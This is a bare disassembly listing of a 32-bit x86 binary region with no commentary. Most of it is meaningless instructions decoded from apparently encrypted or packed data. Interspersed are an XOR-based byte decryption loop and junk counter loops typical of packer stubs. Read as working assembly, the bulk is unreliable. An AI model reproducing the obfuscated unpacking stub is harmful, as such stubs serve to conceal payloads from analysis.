  402940:	fstp   TBYTE PTR [ebx-0x5b87856d]
  402946:	ror    BYTE PTR [ecx+0x1f],1
  402949:	cmp    cl,BYTE PTR [ecx]
  40294b:	test   al,0xec
  40294d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40294e:	sub    eax,0x2daf0b53
  402953:	inc    ebp
  402954:	dec    edx
  402955:	ret    
  402956:	enter  0xa9b3,0xf
  40295a:	aad    0xc6
  40295c:	adc    DWORD PTR [edx],esp
  40295e:	dec    ebx
  40295f:	fs inc edi
  402961:	fs pop ebx
  402963:	sbb    DWORD PTR [esi],ebp
  402965:	jb     0x4029a1
  402967:	sub    edi,DWORD PTR [ebp-0x5f89ab0f]
  40296d:	scas   eax,DWORD PTR es:[edi]
  40296e:	adc    ah,BYTE PTR [esi]
  402970:	outs   dx,BYTE PTR ds:[esi]
  402971:	cs or  bl,al
  402974:	mov    dh,0x9c
  402976:	sub    BYTE PTR [edi+ecx*8],ch
  402979:	cli    
  40297a:	xor    ecx,DWORD PTR [eax-0x4ce1d150]
  402980:	jecxz  0x4029df
  402982:	pop    ss
  402983:	inc    esi
  402984:	fcomp  QWORD PTR [ebp-0x18]
  402987:	inc    eax
  402988:	(bad)
  40298c:	inc    esi
  40298d:	arpl   WORD PTR [eax],bx
  40298f:	cld    
  402990:	test   eax,0xca28d185
  402995:	(bad)  
  402996:	ret    
  402997:	cdq    
  402998:	aaa    
  402999:	push   edx
  40299a:	test   BYTE PTR [esi+0x36],ah
  40299d:	out    0xf6,eax
  40299f:	sbb    cl,BYTE PTR [edx-0x7ed817e9]
  4029a5:	jge    0x402a09
  4029a7:	cmp    ecx,0x12
  4029aa:	cmp    al,0x2b
  4029ac:	mov    es,WORD PTR [esp+esi*1+0x6d994ac7]
  4029b3:	adc    al,dh
  4029b5:	xchg   edi,eax
  4029b6:	pop    ebx
  4029b7:	push   ss
  4029b8:	loope  0x402a0e
  4029ba:	imul   eax,DWORD PTR [eax],0x6853c9db
  4029c0:	ins    BYTE PTR es:[edi],dx
  4029c1:	push   ebp
  4029c2:	push   ebp
  4029c3:	pop    ebx
  4029c4:	lods   al,BYTE PTR ds:[esi]
  4029c5:	inc    ecx
  4029c6:	push   edx
  4029c7:	push   ecx
  4029c8:	ja     0x402a34
  4029ca:	sti    
  4029cb:	imul   ebp,edi,0x19
  4029ce:	mov    al,0xfb
  4029d0:	dec    edi
  4029d1:	or     esp,esp
  4029d3:	pop    edi
  4029d4:	push   edi
  4029d5:	pop    ss
  4029d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029d7:	jne    0x402979
  4029d9:	and    bl,BYTE PTR [eax+esi*8+0x2]
  4029dd:	add    dh,bh
  4029df:	int3   
  4029e0:	cmp    eax,0x1abfc7f6
  4029e6:	sbb    al,0xfb
  4029e8:	jmp    FWORD PTR [ebx]
  4029ea:	mov    edx,0xb8b96173
  4029ef:	push   ebx
  4029f0:	mov    eax,ds:0x564cde2a
  4029f5:	outs   dx,BYTE PTR ds:[esi]
  4029f6:	push   edi
  4029f7:	fs push eax
  4029f9:	push   esi
  4029fa:	int    0xc1
  4029fc:	sbb    eax,DWORD PTR [ecx-0x5dbe16c0]
  402a02:	cmp    DWORD PTR [esi],ebx
  402a04:	dec    ebp
  402a05:	cdq    
  402a06:	pop    ebx
  402a07:	push   ebp
  402a08:	or     DWORD PTR [esi+0x49],eax
  402a0b:	jno    0x402994
  402a0d:	mov    eax,DWORD PTR [ebx]
  402a0f:	jge    0x402a21
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0xd0f25880,al
  402a42:	jo     0x402aac
  402a44:	or     al,0x7e
  402a46:	jle    0x402a9d
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a8f
  402a4c:	aad    0xfc
  402a4e:	stos   DWORD PTR es:[edi],eax
  402a4f:	xchg   esp,eax
  402a50:	mov    edx,0xc81a81be
  402a55:	and    al,0x2f
  402a57:	push   ebx
  402a58:	bound  edx,QWORD PTR [eax+0x3b7e09db]
  402a5e:	jecxz  0x402a96
  402a60:	sbb    dl,al
  402a62:	(bad)  
  402a63:	fnstenv [ebp+0x28749814]
  402a69:	mov    esi,0xdbb3b042
  402a6e:	xchg   ecx,eax
  402a6f:	or     ebp,DWORD PTR [edi+0x30]
  402a72:	adc    DWORD PTR [edi+0x4b7bc39e],0x4d16413d
  402a7c:	aam    0x8b
  402a7e:	pop    ebx
  402a7f:	mov    cl,ah
  402a81:	mov    bl,0xc8
  402a83:	int3   
  402a84:	cmc    
  402a85:	inc    edx
  402a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a87:	out    0x7f,al
  402a89:	pop    ecx
  402a8a:	mov    gs,ebx
  402a8c:	ins    BYTE PTR es:[edi],dx
  402a8d:	scas   eax,DWORD PTR es:[edi]
  402a8e:	jl     0x402a54
  402a90:	std    
  402a91:	pop    esp
  402a92:	scas   eax,DWORD PTR es:[edi]
  402a93:	xor    ebx,esi
  402a95:	mov    dl,0x7c
  402a97:	push   ecx
  402a98:	call   0x560c:0x1976a67f
  402a9f:	add    esp,DWORD PTR [ebx]
  402aa1:	mov    ecx,0x3fbe36fe
  402aa6:	in     al,0xae
  402aa8:	repnz out 0xd,al
  402aab:	fadd   st,st(5)
  402aad:	sub    edx,DWORD PTR [ecx-0x61]
  402ab0:	jns    0x402a72
  402ab2:	dec    esi
  402ab3:	xor    eax,0xcab30d13
  402ab8:	aam    0x87
  402aba:	jae    0x402a58
  402abc:	cmp    esi,esi
  402abe:	imul   dh
  402ac0:	mov    eax,ds:0x36f7ca74
  402ac5:	xchg   edx,eax
  402ac6:	mov    edi,eax
  402ac8:	int    0xfe
  402aca:	lock mov gs:0x625f49bf,eax
  402ad1:	popf   
  402ad2:	sbb    al,BYTE PTR [esi-0x6f]
  402ad5:	out    dx,al
  402ad6:	pop    ds
  402ad7:	inc    ebp
  402ad8:	popf   
  402ad9:	scas   eax,DWORD PTR es:[edi]
  402ada:	outs   dx,DWORD PTR ds:[esi]
  402adb:	data16 mov cl,0x43
  402ade:	outs   dx,BYTE PTR ds:[esi]
  402adf:	or     cl,ch
  402ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ae2:	add    al,0x37
  402ae4:	lahf   
  402ae5:	(bad)  
  402ae6:	push   esi
  402ae7:	enter  0x6e4c,0x26
  402aeb:	adc    al,BYTE PTR [edi]
  402aed:	mov    BYTE PTR [esi],bl
  402aef:	in     eax,0x70
  402af1:	mov    bh,0x5b
  402af3:	add    dh,BYTE PTR [ebp+0x21]
  402af6:	push   ss
  402af7:	std    
  402af8:	mov    ds:0xe1adb3fa,al
  402afd:	mov    bl,0xa6
  402aff:	mov    esp,0x3a657795
  402b04:	shl    DWORD PTR [esi],0x1e
  402b07:	mov    ah,0x61
  402b09:	adc    al,0xa
  402b0b:	retf   
  402b0c:	mov    ds,WORD PTR [edi+0x501e076d]
  402b12:	pop    es
  402b13:	mov    cs,WORD PTR [edi+0x1820e63f]
  402b19:	sub    bh,BYTE PTR [ecx]
  402b1b:	mov    ebx,DWORD PTR [ecx+ebp*1+0x20949c55]
  402b22:	jbe    0x402ae9
  402b24:	mov    dh,0xbf
  402b26:	addr16 lahf 
  402b28:	or     al,0x4b
  402b2a:	sbb    al,0x7c
  402b2c:	push   esp
  402b2d:	lods   eax,DWORD PTR ds:[esi]
  402b2e:	int3   
  402b2f:	sub    BYTE PTR [esi+0x6f6e93a7],0xd9
  402b36:	add    al,0xc4
  402b38:	pop    esi
  402b39:	cs push cs
  402b3b:	aad    0x9c
  402b3d:	mov    edx,0xe709ab43
  402b42:	data16 mov dh,0xa6
  402b45:	dec    edx
  402b46:	clc    
  402b47:	add    eax,0x8d3f4624
  402b4c:	dec    edi
  402b4d:	pop    ebx
  402b4e:	jae    0x402bbb
  402b50:	pop    esp
  402b51:	pop    edx
  402b52:	test   BYTE PTR [edx+0x14478cb5],ch
  402b58:	add    eax,0x9356ac59
  402b5d:	es adc eax,0x2b062214
  402b63:	or     esp,esp
  402b65:	icebp  
  402b66:	popf   
  402b67:	adc    bl,BYTE PTR [esi-0x68]
  402b6a:	lea    ebx,[esi+0x53]
  402b6d:	test   esi,esi
  402b6f:	or     eax,0x339a3df3
  402b74:	cli    
  402b75:	(bad)  
  402b76:	scas   eax,DWORD PTR es:[edi]
  402b77:	hlt    
  402b78:	test   DWORD PTR [esi],0xc272740c
  402b7e:	sbb    eax,0xea7aa403
  402b83:	fdiv   QWORD PTR [eax-0x24]
  402b86:	add    al,cl
  402b88:	push   ebp
  402b89:	jge    0x402bd6
  402b8b:	dec    edx
  402b8c:	popa   
  402b8d:	mov    DWORD PTR [esi-0x692f1d9],edi
  402b93:	mov    ah,0xad
  402b95:	sub    eax,0xa20db84e
  402b9a:	jno    0x402b6c
  402b9c:	or     eax,0xf3097ebc
  402ba1:	jge    0x402bbf
  402ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ba4:	xchg   esi,eax
  402ba5:	sub    DWORD PTR [ebx+0x172bff35],eax
  402bab:	loopne 0x402b44
  402bad:	cmc    
  402bae:	into   
  402baf:	push   eax
  402bb0:	lods   eax,DWORD PTR ds:[esi]
  402bb1:	jae    0x402ba2
  402bb3:	test   eax,0xba3583d1
  402bb8:	mov    WORD PTR [esi+eax*8],gs
  402bbb:	inc    esi
  402bbc:	mov    eax,ds:0xde2d1a40
  402bc1:	cmp    DWORD PTR [eax],edi
  402bc3:	sub    BYTE PTR [edi],al
  402bc5:	pop    esp
  402bc6:	retf   0xca
  402bc9:	sub    BYTE PTR [eax+0x3b],al
  402bcc:	cld    
  402bcd:	push   edx
  402bce:	fs pop esp
  402bd0:	inc    eax
  402bd1:	dec    ebp
  402bd2:	ins    DWORD PTR es:[edi],dx
  402bd3:	repnz adc al,0xdf
  402bd6:	(bad)  
  402bd7:	sub    eax,0x63c09a01
  402bdc:	pop    edi
  402bdd:	pop    edi
  402bde:	xor    ch,BYTE PTR [esi+0xd352735]
  402be4:	push   ss
  402be5:	or     al,0xf1
  402be7:	pop    ecx
  402be8:	aad    0xc1
  402bea:	shr    ch,0xaa
  402bed:	outs   dx,DWORD PTR ds:[esi]
  402bee:	inc    esp
  402bef:	pop    esi
  402bf0:	sub    edx,DWORD PTR [ebx]
  402bf2:	jae    0x402b77
  402bf4:	ficom  DWORD PTR ds:0x5efcdf61
  402bfa:	dec    edi
  402bfb:	mov    fs,ebp
  402bfd:	ret    
  402bfe:	cs into 
  402c00:	and    al,0x47
  402c02:	xor    ah,BYTE PTR ds:0xd226d591
  402c08:	fisub  DWORD PTR [ebx]
  402c0a:	inc    edi
  402c0b:	add    al,BYTE PTR [ebp+ecx*2-0x7f]
  402c0f:	add    DWORD PTR [eax],eax
  402c11:	mov    WORD PTR [eax-0x754007f8],ss
  402c17:	retf   
  402c18:	nop
  402c19:	call   ebp
  402c1b:	inc    ebp
  402c1c:	ret    0x362e
  402c1f:	and    bh,0x23
  402c22:	loope  0x402bab
  402c24:	mov    eax,0x3f933a7
  402c29:	dec    BYTE PTR [ebx-0x50f0f78b]
  402c2f:	cli    
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x50
  402c6b:	mov    ds,esi
  402c6d:	push   0x7e7e0a4f
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c1c
  402c77:	mov    BYTE PTR [edx+0x26],bl
  402c7a:	push   es
  402c7b:	xor    esi,DWORD PTR [ebx]
  402c7d:	xor    al,0xb7
  402c7f:	loopne 0x402c7e
  402c81:	repnz or edx,eax
  402c84:	push   0x6e08cf93
  402c89:	les    ebp,FWORD PTR [edi+0x566981d6]
  402c8f:	mov    esp,0xb47d26b2
  402c94:	nop
  402c95:	or     ah,BYTE PTR [ecx]
  402c97:	retf   0xd506
  402c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c9b:	test   al,0xa6
  402c9d:	pop    edi
  402c9e:	ret    0x74b4
  402ca1:	pop    eax
  402ca2:	int3   
  402ca3:	stos   DWORD PTR es:[edi],eax
  402ca4:	adc    edi,eax
  402ca6:	inc    BYTE PTR [edi-0x67]
  402ca9:	out    dx,eax
  402caa:	adc    dl,BYTE PTR [ebp-0x25]
  402cad:	pushf  
  402cae:	mov    WORD PTR [ebp-0x1c],gs
  402cb1:	call   0x477e702d
  402cb6:	shr    DWORD PTR ss:[edx+0x6a],cl
  402cba:	jp     0x402cf8
  402cbc:	or     cl,BYTE PTR [ebx-0x11375c28]
  402cc2:	jle    0x402cd5
  402cc4:	neg    BYTE PTR [edx-0x7f]
  402cc7:	setns  BYTE PTR [ecx+0xd60c30]
  402cce:	adc    ah,BYTE PTR [ecx-0x2d]
  402cd1:	ja     0x402d39
  402cd3:	mov    ebp,0xdf030dda
  402cd8:	loopne 0x402c7e
  402cda:	jl     0x402d21
  402cdc:	push   esi
  402cdd:	lods   al,BYTE PTR ds:[esi]
  402cde:	sub    cl,ah
  402ce0:	sti    
  402ce1:	pusha  
  402ce2:	mov    WORD PTR [ebx-0x47115db5],?
  402ce8:	idiv   BYTE PTR [esi-0x45]
  402ceb:	pusha  
  402cec:	jle    0x402cb3
  402cee:	(bad)  
  402cef:	push   ds
  402cf0:	retf   0x3f2
  402cf3:	adc    bl,BYTE PTR [ecx+eiz*1-0x67]
  402cf7:	jle    0x402d20
  402cf9:	jnp    0x402ca8
  402cfb:	jp     0x402d67
  402cfd:	mov    edi,0x10042d71
  402d02:	stc    
  402d03:	push   ebx
  402d04:	jb     0x402c98
  402d06:	fcomp  QWORD PTR [ebx]
  402d08:	out    dx,eax
  402d09:	xchg   BYTE PTR [edi],ch
  402d0b:	sti    
  402d0c:	push   ds
  402d0d:	loop   0x402d36
  402d0f:	pop    es
  402d10:	dec    edi
  402d11:	cwde   
  402d12:	add    BYTE PTR [ebx+0x439c247c],0x5a
  402d19:	cmp    eax,0x25fcaf13
  402d1e:	jno    0x402d0e
  402d20:	ds dec ebx
  402d22:	add    eax,0xb1fad10d
  402d27:	mov    ebx,0x61cb0bcc
  402d2c:	inc    edx
  402d2d:	mov    ah,0xe6
  402d2f:	jecxz  0x402d4d
  402d31:	sub    esi,eax
  402d33:	retf   
  402d34:	int    0x89
  402d36:	fsubr  DWORD PTR [ecx+0x79]
  402d39:	inc    ebx
  402d3a:	xor    al,0x78
  402d3c:	adc    DWORD PTR [eax-0x39],ebx
  402d3f:	(bad)  
  402d41:	pop    edi
  402d42:	retf   0x7217
  402d45:	xchg   ecx,eax
  402d46:	xor    eax,0x18602062
  402d4b:	jl     0x402cf1
  402d4d:	in     al,dx
  402d4e:	push   ds
  402d4f:	into   
  402d50:	test   DWORD PTR [esi],esp
  402d52:	les    ecx,FWORD PTR [ebx]
  402d54:	add    esi,DWORD PTR [edi+0x73]
  402d57:	mov    bl,0x5e
  402d59:	test   BYTE PTR [ebp-0x14],cl
  402d5c:	imul   eax,esp,0x5454cc18
  402d62:	rcl    DWORD PTR [edi+0x57],1
  402d65:	xor    ch,dh
  402d67:	popf   
  402d68:	mov    BYTE PTR [esi+0x706d0124],bl
  402d6e:	mov    ss,WORD PTR ds:0x91b80c12
  402d74:	out    0x5f,al
  402d76:	scas   eax,DWORD PTR es:[edi]
  402d77:	jle    0x402dc6
  402d79:	js     0x402da5
  402d7b:	cmp    DWORD PTR [esi+0x33],esi
  402d7e:	jmp    0x402dad
  402d80:	lods   eax,DWORD PTR ds:[esi]
  402d81:	cwde   
  402d82:	test   eax,0x315595c2
  402d87:	xchg   BYTE PTR [ebx],cl
  402d89:	adc    al,0xfa
  402d8b:	jle    0x402d75
  402d8d:	mov    ds:0x54974bc8,al
  402d92:	mov    al,ds:0xda714b76
  402d97:	cmp    BYTE PTR [ebp+0x2b4a23bb],ch
  402d9d:	pop    eax
  402d9e:	inc    edi
  402d9f:	and    eax,0xd2dd87ba
  402da4:	lds    edx,FWORD PTR [ecx+0x11741306]
  402daa:	jmp    0x402d76
  402dac:	push   ebx
  402dad:	jnp    0x402e2e
  402daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db0:	test   al,0x29
  402db2:	aaa    
  402db3:	fs pop edx
  402db5:	retf   
  402db6:	imul   edx,DWORD PTR [eax],0x27
  402db9:	scas   eax,DWORD PTR es:[edi]
  402dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dbb:	push   ds
  402dbc:	inc    esp
  402dbd:	and    al,0xa7
  402dbf:	in     al,dx
  402dc0:	enter  0xd4d,0x27
  402dc4:	jns    0x402d49
  402dc6:	inc    ebx
  402dc7:	mov    ecx,0x556ff094
  402dcc:	pop    ds
  402dcd:	cdq    
  402dce:	call   0xff6b:0xd72ddce5
  402dd5:	jl     0x402d72
  402dd7:	(bad)  
  402dd8:	pop    esp
  402dd9:	gs into 
  402ddb:	daa    
  402ddc:	ret    0x2a3d
  402ddf:	scas   al,BYTE PTR es:[edi]
  402de0:	adc    eax,0x84524545
  402de5:	xor    ecx,DWORD PTR [edx]
  402de7:	fs mov bh,0x6
  402dea:	and    eax,0xc53b7a6e
  402def:	push   edx
  402df0:	adc    al,0xd
  402df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402df3:	dec    esi
  402df4:	fld    DWORD PTR [esi+0x3e]
  402df7:	std    
  402df8:	scas   eax,DWORD PTR es:[edi]
  402df9:	push   ebx
  402dfa:	push   0x3a43db5f
  402dff:	or     al,0x29
  402e01:	and    esi,edx
  402e03:	sub    al,0xc1
  402e05:	adc    al,ch
  402e07:	lahf   
  402e08:	retf   0x97d5
  402e0b:	pop    ebx
  402e0c:	pop    eax
  402e0d:	dec    esp
  402e0e:	cmp    BYTE PTR [esi+edi*8-0x41f54a82],ch
  402e15:	ss cmp esi,0xffffff98
  402e19:	call   0x2e4f:0x9a46d527
  402e20:	or     eax,0x8bbaf657
  402e25:	xchg   DWORD PTR [eax-0xd],esi
  402e28:	imul   esi,DWORD PTR [esp+ebp*4],0x7c9384cf
  402e2f:	mov    edi,0x7ef23acf
  402e34:	pusha  
  402e35:	dec    eax
  402e36:	cdq    
  402e37:	jg     0x402ead
  402e39:	out    0xbf,al
  402e3b:	ficomp WORD PTR [ebx+0x62ca2306]
  402e41:	or     BYTE PTR ds:0xd5be4361,dh
  402e47:	cmp    ebx,ecx
  402e49:	dec    BYTE PTR [eax-0x130186a7]
  402e4f:	(bad)  
  402e50:	adc    DWORD PTR [ebx],eax
  402e52:	jne    0x402e64
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	xchg   ecx,eax
  403050:	ret    0x527f
  403053:	mov    ds:0xae7e7e08,al
  403058:	jg     0x4030d8
  40305a:	jle    0x4030c6
  40305c:	or     al,0x6a
  40305e:	popa   
  40305f:	push   ds
  403060:	or     BYTE PTR [ecx-0x62],ch
  403063:	enter  0x1d7c,0x24
  403067:	xor    eax,0xb5d81a6d
  40306c:	or     esi,eax
  40306e:	fwait
  40306f:	cwde   
  403070:	jl     0x403035
  403072:	daa    
  403073:	xor    BYTE PTR [ebp+0x26],al
  403076:	add    al,0x5f
  403078:	fdivr  DWORD PTR [ebx]
  40307a:	nop
  40307b:	mov    dh,0x95
  40307d:	push   esi
  40307e:	cmp    DWORD PTR [edi],0x2407d835
  403084:	bound  ebp,QWORD PTR [eax+0x72d42189]
  40308a:	add    DWORD PTR [esi+edi*8],ecx
  40308d:	sahf   
  40308e:	jne    0x403057
  403090:	jge    0x403044
  403092:	xchg   edi,eax
  403093:	lahf   
  403094:	sub    eax,0xf7bf5ed6
  403099:	adc    al,0x8
  40309b:	push   ebp
  40309d:	jmp    0x40309e
  40309f:	jg     0x4030c3
  4030a1:	repz mov ah,0xcd
  4030a4:	addr16 push ecx
  4030a6:	test   DWORD PTR [edi+0x656229e5],eax
  4030ac:	xchg   BYTE PTR ds:0xa811f0ea,ah
  4030b2:	mov    edi,DWORD PTR [edi+0x77]
  4030b5:	jbe    0x403136
  4030b7:	jle    0x40307b
  4030b9:	jp     0x4030a2
  4030bb:	lods   eax,DWORD PTR ds:[esi]
  4030bc:	lds    eax,FWORD PTR [edi]
  4030be:	not    edi
  4030c0:	sbb    al,0x1c
  4030c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030c3:	(bad)  
  4030c4:	dec    edi
  4030c5:	inc    ebp
  4030c6:	aaa    
  4030c7:	lea    ebp,[ebx]
  4030c9:	jnp    0x403059
  4030cb:	push   edx
  4030cc:	adc    ch,bh
  4030ce:	ret    0xde42
  4030d1:	jl     0x403120
  4030d3:	or     DWORD PTR [edi-0x3df034b9],ebp
  4030d9:	pop    ss
  4030da:	mov    esi,0xb8caf5af
  4030df:	hlt    
  4030e0:	mov    esp,0xd44004e2
  4030e5:	lock mov edx,0xbd0bde7a
  4030eb:	push   es
  4030ec:	xchg   ecx,eax
  4030ed:	cld    
  4030ee:	mov    dl,0xda
  4030f0:	es jmp 0x4acd8b
  4030f6:	jmp    0x403125
  4030f8:	rcl    al,cl
  4030fa:	std    
  4030fb:	adc    eax,0xc6f197c7
  403100:	hlt    
  403101:	fmul   QWORD PTR [ebx+0x71a50e15]
  403107:	lods   eax,DWORD PTR ds:[esi]
  403108:	mov    edi,ebx
  40310a:	lea    ecx,[edi]
  40310c:	leave  
  40310d:	xchg   edx,eax
  40310e:	addr16 xchg edx,eax
  403110:	ins    DWORD PTR es:[edi],dx
  403111:	adc    edx,edx
  403113:	xchg   BYTE PTR [eax-0x63],ah
  403116:	aam    0xa7
  403118:	and    BYTE PTR [ecx+ebx*2+0x3dc6d3],0xe9
  403120:	mov    eax,0x34b9d0c1
  403125:	test   al,0x8e
  403127:	inc    esp
  403128:	sti    
  403129:	lods   al,BYTE PTR ds:[si]
  40312b:	push   ss
  40312c:	shl    BYTE PTR [ebp+0x57],1
  40312f:	dec    eax
  403130:	mov    bh,0xa
  403132:	dec    esp
  403133:	sbb    ch,bl
  403135:	jo     0x403169
  403137:	inc    eax
  403138:	cmp    al,0xe2
  40313a:	cmp    al,0x90
  40313c:	sti    
  40313d:	push   cs
  40313e:	push   eax
  40313f:	mov    ?,eax
  403141:	mov    ds:0x5e7adead,eax
  403146:	setp   dh
  403149:	jg     0x403171
  40314b:	test   BYTE PTR [ebx-0x46dc2d76],al
  403151:	mov    edi,cs
  403153:	aad    0x79
  403155:	stc    
  403156:	cmp    DWORD PTR [ecx+0x65],0xcf027577
  40315d:	sbb    bl,BYTE PTR [ecx+0x26]
  403160:	mov    DWORD PTR ds:[ebx],0x89ee430e
  403167:	cli    
  403168:	cmp    DWORD PTR [ebp-0x3],esi
  40316b:	jecxz  0x403182
  40316d:	les    eax,FWORD PTR [ecx-0x46927534]
  403173:	xor    dh,0x84
  403176:	popf   
  403177:	das    
  403178:	idiv   BYTE PTR [ebp-0x41]
  40317b:	xor    al,0x64
  40317d:	mov    edx,0xe1ec2ad2
  403182:	mov    eax,ds:0xcf2b529
  403187:	pop    esp
  403188:	or     al,0xbf
  40318a:	gs push ecx
  40318c:	dec    ebx
  40318d:	test   DWORD PTR ds:[esi-0x430a9137],edx
  403194:	mov    bh,ch
  403196:	pusha  
  403197:	add    bh,bh
  403199:	sti    
  40319a:	cld    
  40319b:	shl    BYTE PTR [ebx+0x7b7f82b3],1
  4031a1:	inc    ebp
  4031a2:	les    edi,FWORD PTR [ebx+0x6c]
  4031a5:	ror    DWORD PTR [ebx+ebp*4-0x721e56ea],1
  4031ac:	cmp    DWORD PTR [edx],0xbfdfe6a5
  4031b2:	mov    dh,0xf9
  4031b4:	scas   eax,DWORD PTR es:[edi]
  4031b5:	inc    ebp
  4031b6:	push   esp
  4031b7:	xchg   ebx,eax
  4031b8:	ret    0x1635
  4031bb:	jb     0x403211
  4031bd:	dec    esp
  4031be:	das    
  4031bf:	adc    eax,DWORD PTR [esi+0x41798364]
